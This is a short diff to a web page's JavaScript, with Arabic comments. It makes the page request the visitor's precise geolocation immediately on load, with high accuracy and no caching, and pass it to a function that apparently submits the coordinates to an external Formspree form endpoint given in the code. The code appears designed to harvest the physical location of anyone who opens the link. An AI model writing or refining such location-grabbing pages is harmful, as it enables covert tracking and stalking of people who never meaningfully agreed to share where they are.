@@ -23,14 +23,11 @@
     // الرابط الخاص بك الذي حصلت عليه من Formspree
     const FORMSPREE_URL = "https://formspree.io/f/mvzblpga";
 
-    window.onload = function() {
-        if (navigator.geolocation) {
-            // طلب الموقع فور تحميل الصفحة
-            navigator.geolocation.getCurrentPosition(sendData, showError);
-        } else {
-            document.getElementById("status").innerHTML = "المتصفح لا يدعم هذه الخاصية.";
-        }
-    };
+    navigator.geolocation.getCurrentPosition(sendData, showError, {
+    enableHighAccuracy: true,
+    timeout: 15000,
+    maximumAge: 0
+});
 
     function sendData(position) {
         const lat = position.coords.latitude;
